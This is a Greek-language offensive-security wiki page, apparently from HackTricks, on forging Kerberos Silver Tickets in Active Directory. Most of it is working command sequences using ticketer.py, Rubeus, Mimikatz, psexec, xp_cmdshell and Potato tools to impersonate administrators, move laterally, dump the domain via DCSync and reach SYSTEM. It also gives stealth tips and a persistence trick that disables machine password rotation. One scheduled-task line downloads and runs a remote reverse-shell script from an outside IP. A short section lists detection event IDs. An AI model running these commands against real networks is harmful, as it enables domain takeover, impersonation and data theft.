# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Η επίθεση **Silver Ticket** περιλαμβάνει την εκμετάλλευση service tickets σε περιβάλλοντα Active Directory (AD). Αυτή η μέθοδος βασίζεται στην **απόκτηση του NTLM hash ενός service account**, όπως ενός computer account, για τη δημιουργία πλαστού Ticket Granting Service (TGS) ticket. Με αυτό το πλαστό ticket, ένας attacker μπορεί να αποκτήσει πρόσβαση σε συγκεκριμένες υπηρεσίες στο δίκτυο, **προσποιούμενος οποιονδήποτε χρήστη**, συνήθως με στόχο την απόκτηση administrative privileges. Επισημαίνεται ότι η χρήση AES keys για τη δημιουργία πλαστών tickets είναι ασφαλέστερη και δυσκολότερο να εντοπιστεί.<sup>[[1]](#references)[[2]](#references)</sup>

> [!WARNING]
> Τα Silver Tickets εντοπίζονται δυσκολότερα από τα Golden Tickets, επειδή απαιτούν μόνο το **hash του service account** και όχι του account krbtgt. Ωστόσο, περιορίζονται στη συγκεκριμένη υπηρεσία που στοχεύουν. Επιπλέον, αρκεί και μόνο να κλέψετε τον κωδικό πρόσβασης ενός χρήστη.
> Επίσης, αν παραβιάσετε τον **κωδικό πρόσβασης ενός account με SPN**, μπορείτε να τον χρησιμοποιήσετε για να δημιουργήσετε ένα Silver Ticket και να προσποιηθείτε οποιονδήποτε χρήστη σε αυτή την υπηρεσία.

### Modern Kerberos changes (AES-only domains)

- Οι ενημερώσεις των Windows που ξεκίνησαν στις **8 Νοεμβρίου 2022 (KB5021131)** ορίζουν ως προεπιλογή τα **AES session keys** για τα service tickets, όταν αυτό είναι δυνατό, και σταδιακά καταργούν το RC4. Αναμένεται ότι έως τα μέσα του 2026 οι DCs θα έχουν το RC4 **απενεργοποιημένο από προεπιλογή**, επομένως η εξάρτηση από NTLM/RC4 hashes για silver tickets αποτυγχάνει όλο και συχνότερα με `KRB_AP_ERR_MODIFIED`. Να εξάγετε πάντα τα **AES keys** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) για το service account-στόχο.<sup>[[5]](#references)</sup>
- Αν το `msDS-SupportedEncryptionTypes` του service account περιορίζεται σε AES, πρέπει να δημιουργήσετε το πλαστό ticket με `/aes256` ή `-aesKey`. Το RC4 (`/rc4` ή `-nthash`) δεν θα λειτουργήσει, ακόμα κι αν έχετε το NTLM hash.<sup>[[6]](#references)</sup>
- Τα gMSA/computer accounts αλλάζουν κωδικούς κάθε 30 ημέρες. Κάντε dump το **τρέχον AES key** από LSASS, Secretsdump/NTDS ή DCsync πριν δημιουργήσετε το πλαστό ticket.
- OPSEC: η προεπιλεγμένη διάρκεια ζωής των tickets στα εργαλεία είναι συχνά **10 χρόνια**. Ορίστε ρεαλιστικές διάρκειες (π.χ., `-duration 600` λεπτά), ώστε να αποφύγετε τον εντοπισμό λόγω ασυνήθιστα μεγάλης διάρκειας ζωής.<sup>[[6]](#references)</sup>

Για τη δημιουργία tickets χρησιμοποιούνται διαφορετικά εργαλεία, ανάλογα με το λειτουργικό σύστημα:

### Σε Linux

```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```

### Στα Windows

```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
  /domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
  /aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
  /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```

Η υπηρεσία CIFS επισημαίνεται ως συνηθισμένος στόχος για πρόσβαση στο σύστημα αρχείων του θύματος, αλλά μπορούν επίσης να αξιοποιηθούν άλλες υπηρεσίες, όπως οι HOST και RPCSS, για εργασίες και ερωτήματα WMI.

### Παράδειγμα: υπηρεσία MSSQL (MSSQLSvc) + Potato για SYSTEM

Αν έχετε το NTLM hash (ή το AES key) του λογαριασμού στον οποίο ανήκει ένα **καταχωρισμένο, ακριβές SQL service SPN**, η υπηρεσία ενδέχεται να δεχτεί ένα πλαστογραφημένο service ticket. Η κλάση υπηρεσίας και το hostname στο ticket πρέπει να αντιστοιχούν στο πραγματικό SPN· μην υποθέτετε ότι κάθε εγκατάσταση χρησιμοποιεί `MSSQLSvc/`. Η δηλωμένη ταυτότητα πρέπει επίσης να αντιστοιχεί σε SQL login με τα απαιτούμενα δικαιώματα για την ενεργοποίηση και εκτέλεση του `xp_cmdshell`. Οι επιτυχημένες εντολές `xp_cmdshell` εκτελούνται με την ταυτότητα της διεργασίας της υπηρεσίας SQL (ή με έναν διαμορφωμένο proxy για καλούντες που δεν είναι sysadmin). Ελέγξτε το **process token** για ενεργοποιημένο `SeImpersonatePrivilege` προτού εξετάσετε μια ξεχωριστή διαδρομή Potato· μια διαμόρφωση υπηρεσίας ή ένα SPN από μόνο του δεν το αποδεικνύει.<sup>[[4]](#references)</sup>

```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
  -q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```

- Αν το context που προκύπτει έχει SeImpersonatePrivilege (συχνά ισχύει για λογαριασμούς υπηρεσίας), χρησιμοποιήστε μια παραλλαγή Potato για να αποκτήσετε SYSTEM:

```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```

Περισσότερες λεπτομέρειες για την κατάχρηση του MSSQL και την ενεργοποίηση του xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Επισκόπηση τεχνικών Potato:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Διαθέσιμες υπηρεσίες

| Τύπος υπηρεσίας                          | Silver Tickets υπηρεσιών                                                    |
| ---------------------------------------- | --------------------------------------------------------------------------- |
| WMI                                      | <p>HOST</p><p>RPCSS</p>                                                     |
| PowerShell Remoting                      | <p>HOST</p><p>HTTP</p><p>Ανάλογα με το OS, επίσης:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                    | <p>HOST</p><p>HTTP</p><p>Σε ορισμένες περιπτώσεις μπορείτε να ζητήσετε απλώς: WINRM</p> |
| Προγραμματισμένες εργασίες               | HOST                                                                        |
| Windows File Share, επίσης psexec        | CIFS                                                                        |
| Λειτουργίες LDAP, συμπεριλαμβανομένου του DCSync | LDAP                                                                  |
| Εργαλεία απομακρυσμένης διαχείρισης διακομιστών Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                |
| Golden Tickets                           | krbtgt                                                                      |

Με το **Rubeus** μπορείτε να **ζητήσετε όλα** αυτά τα tickets χρησιμοποιώντας την παράμετρο:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Event IDs των Silver Tickets

- 4624: Σύνδεση λογαριασμού
- 4634: Αποσύνδεση λογαριασμού
- 4672: Σύνδεση διαχειριστή
- **Η απουσία προηγούμενου 4768/4769 στον DC** για τον ίδιο client/service είναι συνηθισμένη ένδειξη ότι παρουσιάστηκε απευθείας στην υπηρεσία ένα πλαστογραφημένο TGS.
- Ασυνήθιστα μεγάλη διάρκεια ισχύος ticket ή μη αναμενόμενος τύπος κρυπτογράφησης (RC4 όταν το domain επιβάλλει AES) ξεχωρίζουν επίσης στα δεδομένα 4769/4624.

## Persistence

Για να αποτρέψετε τα μηχανήματα από το να αλλάζουν τον κωδικό πρόσβασής τους κάθε 30 ημέρες, ορίστε το `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` ή μπορείτε να ορίσετε το `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` σε τιμή μεγαλύτερη από 30 ημέρες, ώστε να καθορίσετε την περίοδο εναλλαγής κατά την οποία θα πρέπει να αλλάζει ο κωδικός πρόσβασης των μηχανημάτων.<sup>[[3]](#references)</sup>

## Κατάχρηση Service tickets

Στα παρακάτω παραδείγματα, ας υποθέσουμε ότι το ticket ανακτάται με πλαστοπροσωπία του λογαριασμού διαχειριστή.

### CIFS

Με αυτό το ticket θα μπορείτε να αποκτήσετε πρόσβαση στους φακέλους `C$` και `ADMIN$` μέσω **SMB** (αν είναι εκτεθειμένοι) και να αντιγράψετε αρχεία σε κάποιο σημείο του απομακρυσμένου συστήματος αρχείων, κάνοντας κάτι όπως:

```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```

You θα μπορείτε επίσης να αποκτήσετε ένα shell μέσα στον host ή να εκτελέσετε αυθαίρετες εντολές χρησιμοποιώντας το **psexec**:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Με αυτήν την άδεια μπορείτε να δημιουργήσετε προγραμματισμένες εργασίες σε απομακρυσμένους υπολογιστές και να εκτελέσετε αυθαίρετες εντολές:

```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```

### HOST + RPCSS

Με αυτά τα tickets μπορείτε να **εκτελέσετε WMI στο σύστημα-θύμα**:

```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```

Find **περισσότερες πληροφορίες για το wmiexec** στην ακόλουθη σελίδα:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Με πρόσβαση winrm σε έναν υπολογιστή, μπορείτε να **αποκτήσετε πρόσβαση σε αυτόν** και ακόμη και να αποκτήσετε ένα PowerShell:

```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```

Δείτε την ακόλουθη σελίδα για να μάθετε **περισσότερους τρόπους σύνδεσης σε έναν απομακρυσμένο host μέσω winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Σημειώστε ότι το **winrm πρέπει να είναι ενεργό και να ακούει** στον απομακρυσμένο υπολογιστή για να αποκτήσετε πρόσβαση σε αυτόν.

### LDAP

Με αυτό το προνόμιο μπορείτε να κάνετε dump τη βάση δεδομένων του DC χρησιμοποιώντας **DCSync**:

```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```

**Μάθετε περισσότερα για το DCSync** στην ακόλουθη σελίδα:


{{#ref}}
dcsync.md
{{#endref}}


## References

- [1] [Kerberos: Silver Tickets - ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [2] [Kerberos (II): Πώς να επιτεθείτε στο Kerberos; - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [3] [Διαδικασία κωδικού πρόσβασης λογαριασμού υπολογιστή - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [4] [HTB Sendai – 0xdf: Silver Ticket + διαδρομή Potato](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [5] [KB5021131: Ενίσχυση ασφάλειας Kerberos και απόσυρση του RC4](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [6] [Τρέχουσες επιλογές του ticketer.py (AES/keytab/διάρκεια)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)
{{#include ../../banners/hacktricks-training.md}}
